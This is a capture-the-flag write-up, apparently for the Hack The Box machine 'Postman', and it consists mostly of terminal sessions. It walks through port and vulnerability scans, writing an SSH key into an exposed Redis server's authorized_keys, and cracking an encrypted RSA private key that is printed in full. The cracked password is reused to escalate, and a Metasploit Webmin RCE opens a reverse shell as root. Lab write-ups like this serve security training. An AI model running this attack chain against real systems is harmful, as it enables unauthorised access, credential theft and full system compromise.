# Postman

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -sC -T4 -p- -sC postman.htb
Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-10-21 16:22 EDT
Nmap scan report for postman.htb (10.10.10.160)
Host is up (0.050s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt
| ssl-cert: Subject: commonName=*/organizationName=Webmin Webserver on Postman
| Not valid before: 2019-08-25T16:26:22
|_Not valid after:  2024-08-23T16:26:22
|_ssl-date: TLS randomness does not represent time
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nuclei -u <http://postman.htb>

                     __     _
   ____  __  _______/ /__  (_)
  / __ \\/ / / / ___/ / _ \\/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\\__,_/\\___/_/\\___/_/   v3.4.10

                projectdiscovery.io
                
                
[CVE-2023-48795] [javascript] [medium] postman.htb:22 ["Vulnerable to Terrapin"]
[ssh-auth-methods] [javascript] [info] postman.htb:22 ["["publickey","password"]"]
[redis-default-logins] [javascript] [high] postman.htb:6379 [passwords=""]
[ssh-server-enumeration] [javascript] [info] postman.htb:22 ["SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3"]
[ssh-sha1-hmac-algo] [javascript] [info] postman.htb:22
[redis-info] [javascript] [info] postman.htb:6379 ["role:master","redis_version:4.0.9","process_id:608","used_cpu_sys:0.61","used_cpu_user:0.21","connected_clients:1","connected_slaves:0","used_memory_human:820.52K"]
[openssh-detect] [tcp] [info] postman.htb:22 ["SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3"]
[exposed-redis] [tcp] [high] postman.htb:6379
```

```bash
┌──(kali㉿kali)-[~/Downloads/redis-rogue-server]
└─$ (echo -e "\\n\\n"; cat ~/.ssh/id_rsa.pub; echo -e "\\n\\n") > spaced_key.txt
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads/redis-rogue-server]
└─$ cat spaced_key.txt 

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLpmmj/zrHbqmJQNgYmeC/u51542F6qlVbeULoOKBOVPH3cdKaN4Qh9oMfVBeL43WLXCHImTF0sjqSifgBg+4V1VNlGBpVVa51uuv64Y49IdC1ASR/P0E/mm+pEs2jpUyqxduQBMSzMasnLQnoGSYAo/gdCfTL/lPFLOJachq107hMCKe7o6eFLt8+NJiyrgZu3xvGTgYcoNebvT+tFdtNB/o5oxfLzb0ihK4rfdYJJBdgOIVF/luEQ0jubGi6jZA+u907/TQ2f0hu3arxytd6hUQ9oIbnHqu4or3hRhCVWZYCrfOhyBI5Ute96eYLNnNLdaL8I2pVqbmLotNsYYv3hVlnPlM0VtZs1fC9BeswHpGFfY7AZLvAUJSss3DgSIyAf2Us/kq/dPqXBTthdsupOBaA4fwuBgSI0OAov4rkgOYCqH+h6zb/y3E9s+fUQfwEPtXHCjgj7IKIoaseqBt8mZRxpVDw/yT3VanwRThd4G0pgZKedltoP8E6L1Vcq+s= kali@kali

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads/redis-rogue-server]
└─$ cat spaced_key.txt | redis-cli -h 10.10.10.160 -x set ssh_key
OK
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads/redis-rogue-server]
└─$ redis-cli -h 10.10.10.160
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK
10.10.10.160:6379>
```

```bash
redis@Postman:~/6379$ cat ../.bash_history 
exit
su Matt
pwd
nano scan.py
python scan.py
nano scan.py
clear
nano scan.py
clear
python scan.py
exit
exit
cat /etc/ssh/sshd_config 
su Matt
clear
cd /var/lib/redis
su Matt
exit
cat id_rsa.bak 
ls -la
```

```bash
redis@Postman:~/6379$ find / -name id_rsa.bak 2>/dev/null
/opt/id_rsa.bak

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```

The key is encrypted

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh2john id_rsa > hash 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa)     
1g 0:00:00:00 DONE (2025-10-21 17:56) 7.692g/s 1898Kp/s 1898Kc/s 1898KC/s confused6..colin22
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We try to login with SSH, but we get the message that the connection was closed

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh matt@postman.htb -i id_rsa                       
Enter passphrase for key 'id_rsa': 
Connection closed by 10.10.10.160 port 22
```

We saw in the history file that the SSH config was opened. We find out that matt is denied to login with SSH

```bash
redis@Postman:~/6379$ cat /etc/ssh/sshd_config

#deny users
DenyUsers Matt
```

We try to su to the user Matt with the same password and are successfull

```bash
redis@Postman:/$ su Matt
Password: 
Matt@Postman:/$
```

We try to reuse Matt’s creds on the webmin portal and we can successfully log in

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FPsp1XSjdZ9XXpHyrotww%2Fimage.png?alt=media&#x26;token=c7d13782-075d-4bff-975a-0986727eb6f8" alt=""><figcaption></figcaption></figure>

Looking at the config files, we find out the running version of webmin

```bash
Matt@Postman:~$ cat /etc/webmin/version 
1.910
```

This version is vulnerable to command execution throught the software package update

```bash
msf exploit(linux/http/webmin_packageup_rce) > run
[*] Started reverse TCP handler on 10.10.16.2:8888 
[+] Session cookie: 142c98ce698fa8df41b9a9f7d8c8adb6
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.16.2:8888 -> 10.10.10.160:36816) at 2025-10-21 18:47:56 -0400
id

uid=0(root) gid=0(root) groups=0(root)
ls /root
redis-5.0.0
root.txt
cat /root/root.txt
7de435b415056ecd7a8a3b5b43a57adb

```
